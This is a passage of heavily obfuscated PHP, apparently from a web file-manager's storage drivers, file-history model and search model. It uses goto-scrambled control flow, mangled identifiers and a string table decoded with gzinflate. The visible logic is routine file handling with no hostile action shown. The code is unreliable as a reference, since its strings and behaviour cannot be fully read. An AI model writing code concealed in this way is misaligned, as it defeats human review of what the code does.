{ public function __construct($e¸„Ï‰’ğ») { parent::__construct($e¸„Ï‰’ğ»); $this->signatureVersion($_SERVER[İë¬“ÅÒÛ›][200]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function copyFile($CŒ…ÌàÃÍ°, $Bœİâ–ˆ¯¿, $cŞ¸î‘¹ŠÅ = array()) { $c¦—÷à²øÉ = $this->tempFile($CŒ…ÌàÃÍ°); $this->download($CŒ…ÌàÃÍ°, $c¦—÷à²øÉ); $cá¢¤çõ—ª = $this->upload($Bœİâ–ˆ¯¿, $c¦—÷à²øÉ); $this->tempFileRemve($c¦—÷à²øÉ); return $cá¢¤çõ—ª; } public function uploadFormData($fÏÖê¥÷âñ, $AÇé†õ‰í‡ = 3600) { return parent::uploadFormData($fÏÖê¥÷âñ, $AÇé†õ‰í‡); } public function fileOut($c†ÌæÌŒ»õ, $d¦Ïâ ÙŠ = false, $A¢Ï¡«î¬¤ = false, $CáŒõ‚Ç¨Î = '') { parent::fileOutServer($c†ÌæÌŒ»õ, $d¦Ïâ ÙŠ, $A¢Ï¡«î¬¤, $CáŒõ‚Ç¨Î); } public function fileOutLink($c™”åó¿„Ê) { header($_SERVER[İë¬“ÅÒÛ›][153] . $c™”åó¿„Ê); die; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($B”¤ãõ½¤Á) { parent::__construct($B”¤ãõ½¤Á); $this->signatureVersion($_SERVER[İë¬“ÅÒÛ›][200]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function _isFolder($Eªç£áØ“) { $EØ–Šƒ¸ÆŒ =& $_SERVER[İë¬“ÅÒÛ›]; $Eªç£áØ“ = trim($Eªç£áØ“, $EØ–Šƒ¸ÆŒ[8]); if (!empty($Eªç£áØ“)) { $Eªç£áØ“ .= $EØ–Šƒ¸ÆŒ[8]; } if ($this->getObjectInfo($Eªç£áØ“)) { return !0; } return parent::_isFolder($Eªç£áØ“); } public function fileOutLink($DÍê†¾ƒ÷) { header($_SERVER[İë¬“ÅÒÛ›][153] . $DÍê†¾ƒ÷); die; } } goto f¸«ØÀÚ×; Aè’‡À“Ë: define($_SERVER[İë¬“ÅÒÛ›][0], $_SERVER[İë¬“ÅÒÛ›][1]); $_SERVER[…Ã²ÛÚÈÔ] = explode($_SERVER[İë¬“ÅÒÛ›][2], gzinflate(substr($_SERVER[İë¬“ÅÒÛ›][3], 10, -8))); function Model($C¯ÍİÎë = '', $c»Ê§‡†™¢ = '', $Cƒ˜¥Äñ = '') { goto EÁ°Ğ„ÎÒ; c™¶Ò ‹™÷: if (isset($Cèè¾«÷†í[$CˆŸ«ïÚŠ])) { return $Cèè¾«÷†í[$CˆŸ«ïÚŠ]; } if ($C¯ÍİÎë) { $C¯ÍİÎë = strtoupper($C¯ÍİÎë[0]) . substr($C¯ÍİÎë, 1); $BˆĞ‚”äö… = $C¯ÍİÎë . $a Ã¤Ş˜Â[1]; if (class_exists($BˆĞ‚”äö…)) { $Cèè¾«÷†í[$CˆŸ«ïÚŠ] = new $BˆĞ‚”äö…(); return $Cèè¾«÷†í[$CˆŸ«ïÚŠ]; } } $Cèè¾«÷†í[$CˆŸ«ïÚŠ] = new ModelBase($C¯ÍİÎë, $c»Ê§‡†™¢, $Cƒ˜¥Äñ); goto d†Ô“´—æ»; d†Ô“´—æ»: return $Cèè¾«÷†í[$CˆŸ«ïÚŠ]; goto fØšƒõÕ™•; EÁ°Ğ„ÎÒ: $a Ã¤Ş˜Â =& $_SERVER[…Ã²ÛÚÈÔ]; static $Cèè¾«÷†í = array(); $CˆŸ«ïÚŠ = strtolower($c»Ê§‡†™¢ . $a Ã¤Ş˜Â[0] . $C¯ÍİÎë); goto c™¶Ò ‹™÷; fØšƒõÕ™•: } goto fÀø¸÷”ùÛ; aÊòËï¢ƒâ: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\x6f\165\x72\x63\x65\137\x68\x69\x73\164\x6f\x72\x79"; public function addHistory($aĞÔ¾ö£ñ, $e¾œô ¤îî = '') { $BÓÇœ–’º„ =& $_SERVER[æ ]; $a¢®ÄŞ›õ  = array($BÓÇœ–’º„[0] => $aĞÔ¾ö£ñ[$BÓÇœ–’º„[1]], $BÓÇœ–’º„[2] => isset($aĞÔ¾ö£ñ[$BÓÇœ–’º„[3]]) ? $aĞÔ¾ö£ñ[$BÓÇœ–’º„[3]] : $aĞÔ¾ö£ñ[$BÓÇœ–’º„[4]], $BÓÇœ–’º„[5] => $aĞÔ¾ö£ñ[$BÓÇœ–’º„[6]], $BÓÇœ–’º„[7] => $aĞÔ¾ö£ñ[$BÓÇœ–’º„[8]], $BÓÇœ–’º„[9] => $e¾œô ¤îî); $this->historyAutoClear($a¢®ÄŞ›õ [$BÓÇœ–’º„[1]]); $this->add($a¢®ÄŞ›õ ); Model($BÓÇœ–’º„[10])->eventFileEdit($aĞÔ¾ö£ñ[$BÓÇœ–’º„[1]]); } private function historyAutoClear($a®ì¨àÇôá) { goto bÒâ¸ÆÍ; bÌ¥–µ×: $Cõ×¨¢Èó = $dùÍ‡ñÈºô - 1; if ($Cõ×¨¢Èó >= 500) { return; } $BœÕ±•¾âß = array($d™êšçÄæ[0] => $a®ì¨àÇôá); goto eæ¨°ëÂÔ¾; eæ¨°ëÂÔ¾: $aÌ¶Ô¬¦… = $this->field($d™êšçÄæ[17])->where($BœÕ±•¾âß)->order($d™êšçÄæ[18])->select(); if (!$aÌ¶Ô¬¦… || $Cõ×¨¢Èó >= count($aÌ¶Ô¬¦…)) { return; } $a¦Ù¤ƒĞ = array_to_keyvalue($aÌ¶Ô¬¦…, $d™êšçÄæ[19], $d™êšçÄæ[20]); goto E‘ø¸éªêÓ; E‘ø¸éªêÓ: $a¦Ù¤ƒĞ = array_slice($a¦Ù¤ƒĞ, $Cõ×¨¢Èó); $E¤™’²¯ÌÓ = array_to_keyvalue($aÌ¶Ô¬¦…, $d™êšçÄæ[19], $d™êšçÄæ[6]); $E¤™’²¯ÌÓ = array_slice($E¤™’²¯ÌÓ, $Cõ×¨¢Èó); goto Eâ¸¿“„¹; Eâ¸¿“„¹: $BœÕ±•¾âß = array($d™êšçÄæ[21] => array($d™êšçÄæ[22], $a¦Ù¤ƒĞ)); $this->where($BœÕ±•¾âß)->delete(); Model($d™êšçÄæ[23])->remove($E¤™’²¯ÌÓ); goto d‹‰¿†Şç—; bÒâ¸ÆÍ: $d™êšçÄæ =& $_SERVER[æ ]; $B±ËÇ‚”ğ = Model($d™êšçÄæ[11])->get($d™êšçÄæ[12]); $dùÍ‡ñÈºô = $B±ËÇ‚”ğ == $d™êšçÄæ[13] ? 3 : $GLOBALS[$d™êšçÄæ[14]][$d™êšçÄæ[15]][$d™êšçÄæ[16]]; goto bÌ¥–µ×; d‹‰¿†Şç—: } public function listData($c§£Œ‡ÈÅŒ) { goto FÛ‡‡Ç­ãå; d—„Œõæ“: $e…ÌÚ†ê¢ô = $this->field($C¿Ğç‚á¯Ô)->where($B£­ºÖ®)->order($DÖ­¿ò‹öµ[18])->selectPage(); $this->_listAppendUser($e…ÌÚ†ê¢ô[$DÖ­¿ò‹öµ[25]]); $cßí–£Ä± = Model($DÖ­¿ò‹öµ[11])->get($DÖ­¿ò‹öµ[12]); goto dõùß¾¿À•; FÛ‡‡Ç­ãå: $DÖ­¿ò‹öµ =& $_SERVER[æ ]; $B£­ºÖ® = array($DÖ­¿ò‹öµ[0] => $c§£Œ‡ÈÅŒ); $C¿Ğç‚á¯Ô = $DÖ­¿ò‹öµ[24]; goto d—„Œõæ“; dõùß¾¿À•: $Cé¿†²çëÖ = 3; if ($cßí–£Ä± == $DÖ­¿ò‹öµ[13]) { $e…ÌÚ†ê¢ô[$DÖ­¿ò‹öµ[25]] = array_slice($e…ÌÚ†ê¢ô[$DÖ­¿ò‹öµ[25]], 0, $Cé¿†²çëÖ); $e…ÌÚ†ê¢ô[$DÖ­¿ò‹öµ[26]] = array($DÖ­¿ò‹öµ[27] => 1, $DÖ­¿ò‹öµ[28] => 20, $DÖ­¿ò‹öµ[29] => 1, $DÖ­¿ò‹öµ[30] => count($e…ÌÚ†ê¢ô[$DÖ­¿ò‹öµ[25]])); } return $e…ÌÚ†ê¢ô; goto C—ÍŞéÏ¶“; C—ÍŞéÏ¶“: } protected function _listAppendUser(&$FÀÒİ½Ø) { $F¹³˜¸çĞ =& $_SERVER[æ ]; $CõÌñ¨– = array_to_keyvalue($FÀÒİ½Ø, $F¹³˜¸çĞ[19], $F¹³˜¸çĞ[31]); $EÙªÍšø = Model($F¹³˜¸çĞ[32])->userListInfo($CõÌñ¨–); foreach ($FÀÒİ½Ø as &$C’Ë“¡’œê) { $fù ƒ Ì« = $C’Ë“¡’œê[$F¹³˜¸çĞ[31]]; $C’Ë“¡’œê[$F¹³˜¸çĞ[4]] = $EÙªÍšø[$fù ƒ Ì«] ? $EÙªÍšø[$fù ƒ Ì«] : !1; } } public function fileInfo($C °Ş¬±½¦) { $CÂ¾‚Àö =& $_SERVER[æ ]; $Dõ™¡×Ø‘ = $this->tablePrefix; $c¬¸‹‘ì = "{$Dõ™¡×Ø‘}\x69\x6f\137\x66\151\154\145\x20\146\151\x6c\x65\163\x20\x6f\156\x20\x66\x69\154\x65\x73\x2e\x66\x69\154\x65\x49\x44\x20\75\x20\150\151\x73\164\157\162\x79\56\146\x69\x6c\145\111\104"; return $this->alias($CÂ¾‚Àö[33])->where(array($CÂ¾‚Àö[21] => $C °Ş¬±½¦))->join($c¬¸‹‘ì, $CÂ¾‚Àö[34])->find(); } public function removeItem($C‚†”¼Ê†Ñ) { $c®Æ¤øÔ =& $_SERVER[æ ]; $B¿éÒĞ¸´Î = array($c®Æ¤øÔ[21] => $C‚†”¼Ê†Ñ); $C†¶õÏÎµ = $this->where($B¿éÒĞ¸´Î)->find(); if ($C†¶õÏÎµ) { $e‘–•ãĞÊö = $this->where($B¿éÒĞ¸´Î)->delete(); Model($c®Æ¤øÔ[23])->remove($C†¶õÏÎµ[$c®Æ¤øÔ[6]]); return $e‘–•ãĞÊö; } return !1; } public function removeBySource($AÈö´çÊ‰“) { goto b—Ê­É¢ñ; b—Ê­É¢ñ: $C ´ŠµĞ¾† =& $_SERVER[æ ]; if (!$AÈö´çÊ‰“) { return !1; } if (!is_array($AÈö´çÊ‰“)) { $AÈö´çÊ‰“ = array($AÈö´çÊ‰“); } goto A”¿¦ÑŒ‘Ã; A”¿¦ÑŒ‘Ã: $C¡Éö‹àÏ‰ = array($C ´ŠµĞ¾†[0] => array($C ´ŠµĞ¾†[22], $AÈö´çÊ‰“)); $EóÓÅ›Ú–® = $this->field($C ´ŠµĞ¾†[5])->where($C¡Éö‹àÏ‰)->select(); if ($EóÓÅ›Ú–®) { $this->where($C¡Éö‹àÏ‰)->delete(); $aªÊ—¡ºÔ… = array_to_keyvalue($EóÓÅ›Ú–®, $C ´ŠµĞ¾†[19], $C ´ŠµĞ¾†[6]); Model($C ´ŠµĞ¾†[23])->remove($aªÊ—¡ºÔ…); } goto F¬ß®ºîÃë; F¬ß®ºîÃë: return !0; goto B¾ÎŸƒŠ›; B¾ÎŸƒŠ›: } public function setDetail($F¾”Ğõ¨°æ, $cÜ½Ã‡…˜„) { $B™£¢õŸØ =& $_SERVER[æ ]; return $this->where(array($B™£¢õŸØ[21] => $F¾”Ğõ¨°æ))->save(array($B™£¢õŸØ[9] => $cÜ½Ã‡…˜„)); } public function rollbackToItem($d ±°à‹½, $Fã¬»êå¥ß) { goto däĞ¹…éÏ…; b°æ…Í…÷Ë: return $this->where(array($DœÍš˜‰º„[21] => $Fã¬»êå¥ß))->delete(); goto b™äï’ À; a¼ˆ²íˆËå: $F¯šÜîùòù = $this->find($Fã¬»êå¥ß); $AˆàÔŞ½¢ç = array($DœÍš˜‰º„[6] => $F¯šÜîùòù[$DœÍš˜‰º„[6]], $DœÍš˜‰º„[8] => $F¯šÜîùòù[$DœÍš˜‰º„[8]], $DœÍš˜‰º„[36] => time(), $DœÍš˜‰º„[3] => USER_ID); Model($DœÍš˜‰º„[35])->where(array($DœÍš˜‰º„[1] => $d ±°à‹½))->save($AˆàÔŞ½¢ç); goto b°æ…Í…÷Ë; däĞ¹…éÏ…: $DœÍš˜‰º„ =& $_SERVER[æ ]; $B‚ÊÆÒ£á = Model($DœÍš˜‰º„[35])->sourceInfo($d ±°à‹½); $this->addHistory($B‚ÊÆÒ£á); goto a¼ˆ²íˆËå; b™äï’ À: } public function clearSame($F£ÆÙĞƒ›) { goto cµƒ­êËƒ; cµƒ­êËƒ: $Fî»Ú‘Îõ½ =& $_SERVER[æ ]; $F‘¼åÄ¢ = $this->listData($F£ÆÙĞƒ›); $Bğ¾ä½Œí‘ = array_to_keyvalue_group($F‘¼åÄ¢, $Fî»Ú‘Îõ½[6]); goto DğàğÂ˜Åâ; CĞ“ÆÏº’Ò: if (!$D‰ù•ìøğ) { return; } $this->where(array($Fî»Ú‘Îõ½[20] => array($Fî»Ú‘Îõ½[22], $D‰ù•ìøğ)))->delete(); Model($Fî»Ú‘Îõ½[23])->remove($DÉß‚—¡¶Û); goto FÚ‰îä„Ã; DğàğÂ˜Åâ: $DÉß‚—¡¶Û = array(); $D‰ù•ìøğ = array(); foreach ($Bğ¾ä½Œí‘ as $BÌç©İªğ’) { if (count($BÌç©İªğ’) <= 1) { continue; } foreach ($BÌç©İªğ’ as $EöÚ™Ê§á) { $DÉß‚—¡¶Û[] = $EöÚ™Ê§á[$Fî»Ú‘Îõ½[6]]; $D‰ù•ìøğ[] = $EöÚ™Ê§á[$Fî»Ú‘Îõ½[20]]; } } goto CĞ“ÆÏº’Ò; FÚ‰îä„Ã: } public function userSpace() { $aŒÔš’ªÅÊ =& $_SERVER[æ ]; $dÒãƒ¾£‰ = $this->tablePrefix; $aÔŠèøîâ² = array($aŒÔš’ªÅÊ[2] => USER_ID); $eá‡ÒŒÌ† = "{$dÒãƒ¾£‰}\151\x6f\137\146\x69\154\145\x20\146\151\154\145\163\x20\157\156\40\146\151\154\145\x73\x2e\146\x69\154\145\111\x44\40\x3d\x20\150\151\163\x74\x6f\x72\171\56\x66\x69\154\x65\x49\104"; return $this->alias($aŒÔš’ªÅÊ[33])->where($aÔŠèøîâ²)->join($eá‡ÒŒÌ†, $aŒÔš’ªÅÊ[34])->sum($aŒÔš’ªÅÊ[8]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($fôÃ³ë†Ê) { goto bÛ•„ÓÜÁ; DõÍ©ÌÌÌ†: if (!$DÏ²Òéã–§[$C˜†á¾áÕØ[157]]) { $bŠ¾¶Ôê†¨ = array_to_keyvalue($Cî‚’â¢âØ, $C˜†á¾áÕØ[33], $C˜†á¾áÕØ[157]); $Bë£Ø„Ş–¹ = implode($C˜†á¾áÕØ[47], $bŠ¾¶Ôê†¨); $a®Æö“êˆ† = $C˜†á¾áÕØ[1708]; } $CÃ½›–à¿¬ = explode($C˜†á¾áÕØ[47], trim($Bë£Ø„Ş–¹, $C˜†á¾áÕØ[47])); return array($a®Æö“êˆ†, $CÃ½›–à¿¬); goto A¡ÊÅ¾¬ÛŠ; bÛ•„ÓÜÁ: $C˜†á¾áÕØ =& $_SERVER[İë¬“ÅÒÛ›]; $Cî‚’â¢âØ = KodIO::fileTypeList(); $DÏ²Òéã–§ = $Cî‚’â¢âØ[$fôÃ³ë†Ê]; goto Eâ¡ËäÙÌÇ; Eâ¡ËäÙÌÇ: if (!$DÏ²Òéã–§) { return array(); } $Bë£Ø„Ş–¹ = $DÏ²Òéã–§[$C˜†á¾áÕØ[157]]; $a®Æö“êˆ† = $C˜†á¾áÕØ[7]; goto DõÍ©ÌÌÌ†; A¡ÊÅ¾¬ÛŠ: } public function listPathType($EğØ˜¬ ‰¹) { $d÷„³¹ÜŠÏ =& $_SERVER[İë¬“ÅÒÛ›]; $D®Ø©Îê—Ÿ = $this->fileTypeWhere($EğØ˜¬ ‰¹); if (!$D®Ø©Îê—Ÿ) { return array(); } $C—’“í‰Ó© = array($d÷„³¹ÜŠÏ[393] => SourceModel::TYPE_USER, $d÷„³¹ÜŠÏ[395] => USER_ID, $d÷„³¹ÜŠÏ[387] => 0, $d÷„³¹ÜŠÏ[389] => $D®Ø©Îê—Ÿ); return $this->listSource($C—’“í‰Ó©); } public function listSearch($CÂ®áğæ¢ë, $bó„Ÿ¾®Ä = 300) { goto cè´´Ó–¦; EŒêŞÜµï: if (!isset($añİñ®Îã–[$aöÂ‹øÒÀİ[411]])) { $añİñ®Îã–[$aöÂ‹øÒÀİ[411]] = 0; } $Aî­ñøÃç™ = $aöÂ‹øÒÀİ[1743]; $f·ÆÔ¹İğÀ = $Aî­ñøÃç™; goto Fë¿Ôïù‚‚; cè´´Ó–¦: $aöÂ‹øÒÀİ =& $_SERVER[İë¬“ÅÒÛ›]; if (isset($CÂ®áğæ¢ë[$aöÂ‹øÒÀİ[1635]]) && $CÂ®áğæ¢ë[$aöÂ‹øÒÀİ[1635]]) { $CÂ®áğæ¢ë[$aöÂ‹øÒÀİ[1635]] = str_replace($aöÂ‹øÒÀİ[1741], $aöÂ‹øÒÀİ[1742], trim($CÂ®áğæ¢ë[$aöÂ‹øÒÀİ[1635]])); } $añİñ®Îã– = $this->_parseSearchWhere($CÂ®áğæ¢ë); goto EŒêŞÜµï; c•ë×¾ØïŒ: $this->_listSearchDesc($déß¿‡—œÂ, $CÂ®áğæ¢ë, $f·ÆÔ¹İğÀ); $this->_listSearchTag($déß¿‡—œÂ, $CÂ®áğæ¢ë, $f·ÆÔ¹İğÀ); $this->_listDataApply($déß¿‡—œÂ[$aöÂ‹øÒÀİ[357]]); goto BÀêïÂ³‚Î; BÀêïÂ³‚Î: $this->_listFilterInfo($déß¿‡—œÂ); return $déß¿‡—œÂ; goto C©êƒÄìè°; Fë¿Ôïù‚‚: $this->_listSearchBindPinyin($CÂ®áğæ¢ë, $añİñ®Îã–, $Aî­ñøÃç™); $this->alias($aöÂ‹øÒÀİ[1744])->_makeOrder()->cache(null, 10); $déß¿‡—œÂ = $this->distinct(!0)->field($Aî­ñøÃç™)->where($añİñ®Îã–)->selectPage($bó„Ÿ¾®Ä); goto c•ë×¾ØïŒ; C©êƒÄìè°: } private function _listSearchTag(&$dÒ¹à‡×í§, $f’›ãòòßË, $f™æªîëõâ) { goto E…ÔÀ×…¿Ÿ; E…ÔÀ×…¿Ÿ: $C‚ÑĞĞÓœ =& $_SERVER[İë¬“ÅÒÛ›]; if (!$f’›ãòòßË[$C‚ÑĞĞÓœ[1635]] || $dÒ¹à‡×í§[$C‚ÑĞĞÓœ[354]][$C‚ÑĞĞÓœ[343]] > 1) { return; } $fç¿Şá¤á = Model($C‚ÑĞĞÓœ[1745])->listData(); goto CÉÖ´ğ‹¶; a¦‹¢¦áà›: if (!$fÙÂ¨õó†º) { return; } $AáÊ„«—ë½ = array($C‚ÑĞĞÓœ[1746] => array($C‚ÑĞĞÓœ[7], $fÙÂ¨õó†º)); $båÊêŒÃŒ“ = Model($C‚ÑĞĞÓœ[1747])->field($C‚ÑĞĞÓœ[76])->where($AáÊ„«—ë½)->select(); goto fÌŸÚ¯»´‚; fÌŸÚ¯»´‚: $båÊêŒÃŒ“ = array_to_keyvalue($båÊêŒÃŒ“, $C‚ÑĞĞÓœ[33], $C‚ÑĞĞÓœ[76]); $EËñÊ İÎ = array_unique($båÊêŒÃŒ“); $this->_listSearchMerge($dÒ¹à‡×í§, $f’›ãòòßË, $f™æªîëõâ, $EËñÊ İÎ); goto FÛËÜï•Ğ½; CÉÖ´ğ‹¶: $fÙÂ¨õó†º = array(); $bƒÄöÖğš = $f’›ãòòßË[$C‚ÑĞĞÓœ[1635]]; foreach ($fç¿Şá¤á as $Fáå¦µ¶åØ) { $bŠÍéÜÖ‡ë = $Fáå¦µ¶åØ[$C‚ÑĞĞÓœ[28]]; $cºéŒ´£‰ï = str_replace($C‚ÑĞĞÓœ[50], $C‚ÑĞĞÓœ[33], Pinyin::encode($bŠÍéÜÖ‡ë)); if (stripos($bŠÍéÜÖ‡ë, $bƒÄöÖğš) !== !1 || stripos($cºéŒ´£‰ï, $bƒÄöÖğš) !== !1) { $fÙÂ¨õó†º[] = $Fáå¦µ¶åØ[$C‚ÑĞĞÓœ[369]]; } } goto a¦‹¢¦áà›; FÛËÜï•Ğ½: } private function _listSearchDesc(&$a¸õè¼¾ª, $d®‰ùÇ¼ØÏ, $F–œÂÛÏ) { goto B‘¥Õù³©ß; CùÎ×Û¬›¾: $aâõÛ¤Ï¤ = array_unique($aâõÛ¤Ï¤); if (!$aâõÛ¤Ï¤) { return; } $eçÈ÷Ñ’ = array($EãÜ™ŒÈ¯ˆ[375] => array($EãÜ™ŒÈ¯ˆ[7], $aâõÛ¤Ï¤), $EãÜ™ŒÈ¯ˆ[88] => $EãÜ™ŒÈ¯ˆ[1590], $EãÜ™ŒÈ¯ˆ[360] => array($EãÜ™ŒÈ¯ˆ[521], $EãÜ™ŒÈ¯ˆ[1637] . $d®‰ùÇ¼ØÏ[$EãÜ™ŒÈ¯ˆ[1635]] . $EãÜ™ŒÈ¯ˆ[1637])); goto e£æ¶ùˆß; B‘¥Õù³©ß: $EãÜ™ŒÈ¯ˆ =& $_SERVER[İë¬“ÅÒÛ›]; if (!$d®‰ùÇ¼ØÏ[$EãÜ™ŒÈ¯ˆ[1635]] || $a¸õè¼¾ª[$EãÜ™ŒÈ¯ˆ[354]][$EãÜ™ŒÈ¯ˆ[343]] > 1) { return; } $aâõÛ¤Ï¤ = $this->listSearchChildren($d®‰ùÇ¼ØÏ[$EãÜ™ŒÈ¯ˆ[385]]); goto CùÎ×Û¬›¾; e£æ¶ùˆß: $bòÊøéòÖ = Model($EãÜ™ŒÈ¯ˆ[381])->field($EãÜ™ŒÈ¯ˆ[375])->where($eçÈ÷Ñ’)->select(); $Cğ‡éåôÑÜ = array_to_keyvalue($bòÊøéòÖ, $EãÜ™ŒÈ¯ˆ[33], $EãÜ™ŒÈ¯ˆ[375]); $this->_listSearchMerge($a¸õè¼¾ª, $d®‰ùÇ¼ØÏ, $F–œÂÛÏ, $Cğ‡éåôÑÜ); goto a™œõí‹ºÖ; a™œõí‹ºÖ: } private function _listSearchMerge(&$e‰ †Ó¦×, $Cìø­Àªãâ, $BÃ˜»ÍËç×, $Bó÷Ñ°Úò¥) { goto AÙ™Çô³; eóÓ‰Ã‡•Ó: $C£Èà¾¿”í = $this->field($BÃ˜»ÍËç×)->where($Eø¨…ì÷¸)->select(); if (!$C£Èà¾¿”í) { return; } $CÔ¢å¾Ì = array(); goto EÀ”ÑğŒ´ƒ; EÀ”ÑğŒ´ƒ: foreach ($C£Èà¾¿”í as $BÖÙ×¼ï§ê) { $A¹×»áèŞ· = $B‡«ëÑÈÌ‚[47] . $Cìø­Àªãâ[$B‡«ëÑÈÌ‚[385]] . $B‡«ëÑÈÌ‚[47]; if (stripos($BÖÙ×¼ï§ê[$B‡«ëÑÈÌ‚[374]], $A¹×»áèŞ·) !== !1) { $CÔ¢å¾Ì[] = $BÖÙ×¼ï§ê; } } $e‰ †Ó¦×[$B‡«ëÑÈÌ‚[357]] = array_merge($CÔ¢å¾Ì, $e‰ †Ó¦×[$B‡«ëÑÈÌ‚[357]]); $e‰ †Ó¦×[$B‡«ëÑÈÌ‚[354]][$B‡«ëÑÈÌ‚[355]] += count($CÔ¢å¾Ì); goto AÃÉ³¼¿Â; eÜÖÁ½Í Ç: $fÎ©½ÕòÇ¦ = array_diff($Bó÷Ñ°Úò¥, $cÍŞäùœÌ); if (!$fÎ©½ÕòÇ¦) { return; } $Eø¨…ì÷¸ = array($B‡«ëÑÈÌ‚[375] => array($B‡«ëÑÈÌ‚[7], $fÎ©½ÕòÇ¦)); goto eóÓ‰Ã‡•Ó; AÙ™Çô³: $B‡«ëÑÈÌ‚ =& $_SERVER[İë¬“ÅÒÛ›]; if (!$Bó÷Ñ°Úò¥) { return; } $cÍŞäùœÌ = array_to_keyvalue($e‰ †Ó¦×[$B‡«ëÑÈÌ‚[357]], $B‡«ëÑÈÌ‚[33], $B‡«ëÑÈÌ‚[375]); goto eÜÖÁ½Í Ç; AÃÉ³¼¿Â: } public function listSearchChildren($A¹¾íĞ³ –, $CîÌğˆÌãà = 5000) { goto eùå¦Á¸æ¨; DÕäöíÔ¿—: $d‡âáø‹Õ½ = $this->field($AøÈ‡Ñ”–‚[375])->where($Fñ»ÛßÓ)->select(); $b‚ƒ‘¤Àİ¼ = array_to_keyvalue($d‡âáø‹Õ½, $AøÈ‡Ñ”–‚[33], $AøÈ‡Ñ”–‚[375]); return $b‚ƒ‘¤Àİ¼; goto dÏ­ÙÙ÷áæ; eùå¦Á¸æ¨: $AøÈ‡Ñ”–‚ =& $_SERVER[İë¬“ÅÒÛ›]; $b‚ƒ‘¤Àİ¼ = array(); $eİœ‡ÍÂ = $this->sourceInfo($A¹¾íĞ³ –); goto d«¨®Ö¬çØ; d«¨®Ö¬çØ: $Fñ»ÛßÓ = array($AøÈ‡Ñ”–‚[374] => array($AøÈ‡Ñ”–‚[521], $eİœ‡ÍÂ[$AøÈ‡Ñ”–‚[374]] . $eİœ‡ÍÂ[$AøÈ‡Ñ”–‚[375]] . $AøÈ‡Ñ”–‚[410])); $eÀÔ´›æÂÔ = $this->field($AøÈ‡Ñ”–‚[375])->where($Fñ»ÛßÓ)->count(); if ($eÀÔ´›æÂÔ > $CîÌğˆÌãà) { return $this->_listSearchChildrenNear($A¹¾íĞ³ –, $CîÌğˆÌãà); } goto DÕäöíÔ¿—; dÏ­ÙÙ÷áæ: } private function _listSearchChildrenNear($FÎô‚À„Úø, $fÁÒ²¢çô’) { goto E‘ÆÇŒß§İ; c¼‚ì¥„õö: $E±áñô†÷½ = $this->field($CçÏİ¯ĞË‘[1748])->where($Cší«ƒÚê)->select(); $A›ù¨ó‹§½ = array_to_keyvalue(array_filter_by_field($E±áñô†÷½, $CçÏİ¯ĞË‘[376], $CçÏİ¯ĞË‘[377]), $CçÏİ¯ĞË‘[33], $CçÏİ¯ĞË‘[375]); $Fâî©‚Áêã = array_merge($Fâî©‚Áêã, array_to_keyvalue($E±áñô†÷½, $CçÏİ¯ĞË‘[33], $CçÏİ¯ĞË‘[375])); goto Dİ¤Í†ë÷; B—ÒÕÂ·‰: $Fâî©‚Áêã = array_merge($Fâî©‚Áêã, array_to_keyvalue($E±áñô†÷½, $CçÏİ¯ĞË‘[33], $CçÏİ¯ĞË‘[375])); $Fâî©‚Áêã = array_slice($Fâî©‚Áêã, 0, $fÁÒ²¢çô’); return $Fâî©‚Áêã; goto e³ë£Ë£ÀÏ; E‘ÆÇŒß§İ: $CçÏİ¯ĞË‘ =& $_SERVER[İë¬“ÅÒÛ›]; $Fâî©‚Áêã = array(); $Cší«ƒÚê = array($CçÏİ¯ĞË‘[385] => $FÎô‚À„Úø); goto c¼‚ì¥„õö; Dİ¤Í†ë÷: if (!$A›ù¨ó‹§½) { return $Fâî©‚Áêã; } $Cší«ƒÚê = array($CçÏİ¯ĞË‘[385] => array($CçÏİ¯ĞË‘[7], $A›ù¨ó‹§½)); $E±áñô†÷½ = $this->field($CçÏİ¯ĞË‘[1748])->where($Cší«ƒÚê)->select(); goto B—ÒÕÂ·‰; e³ë£Ë£ÀÏ: } private function _listSearchBindPinyin($eïÆÒ³, &$FÙÔ‹Ñãªí, &$dÈè††) { goto AİÈ÷‰Ê…å; FÛİÕã‡: $BÊé‚„ßçª[] = array($D…‹ë¯‚ñ[1752] => $a½ÂŞ¿…µè, $D…‹ë¯‚ñ[684] => $D…‹ë¯‚ñ[1639], array($D…‹ë¯‚ñ[1753] => $a½ÂŞ¿…µè, $D…‹ë¯‚ñ[1754] => array($D…‹ë¯‚ñ[7], array($D…‹ë¯‚ñ[405], $D…‹ë¯‚ñ[406])))); $this->join($fƒ”Œ«äŸŒ); $FÙÔ‹Ñãªí = $BÊé‚„ßçª; goto eÒÒóÜ“ÂÔ; EÙ¹‹äÜ‡: unset($FÙÔ‹Ñãªí[$D…‹ë¯‚ñ[28]]); foreach ($FÙÔ‹Ñãªí as $fäï×»„÷Ê => $C¥í¯¾“¢) { $BÊé‚„ßçª[$D…‹ë¯‚ñ[1750] . $fäï×»„÷Ê] = $C¥í¯¾“¢; } $a½ÂŞ¿…µè = array($D…‹ë¯‚ñ[409], $D…‹ë¯‚ñ[1637] . $eïÆÒ³[$D…‹ë¯‚ñ[1635]] . $D…‹ë¯‚ñ[1637]); goto FÛİÕã‡; b°œÊ—Ö…Ì: $BÊé‚„ßçª = array(); $dÈè†† = str_replace(array($D…‹ë¯‚ñ[224], $D…‹ë¯‚ñ[50], $D…‹ë¯‚ñ[1749]), $D…‹ë¯‚ñ[33], $dÈè††); $dÈè†† = $D…‹ë¯‚ñ[1750] . str_replace($D…‹ë¯‚ñ[47], $D…‹ë¯‚ñ[1751], $dÈè††); goto EÙ¹‹äÜ‡; AİÈ÷‰Ê…å: $D…‹ë¯‚ñ =& $_SERVER[İë¬“ÅÒÛ›]; if (!Input::check($eïÆÒ³[$D…‹ë¯‚ñ[1635]], $D…‹ë¯‚ñ[310]) || strlen($eïÆÒ³[$D…‹ë¯‚ñ[1635]]) < 2) { return; } $fƒ”Œ«äŸŒ = "\x4c\105\106\x54\40\112\117\111\x4e\40{$this->tablePrefix}\151\x6f\137\x73\x6f\165\x72\143\145\137\155\145\x74\141\x20\155\145\164\x61\40\157\x6e\40\163\157\x75\x72\143\x65\56\x73\x6f\x75\x72\x63\145\x49\104\40\75\x20\x6d\145\164\x61\56\x73\x6f\165\x72\143\145\111\x44"; goto b°œÊ—Ö…Ì; eÒÒóÜ“ÂÔ: } 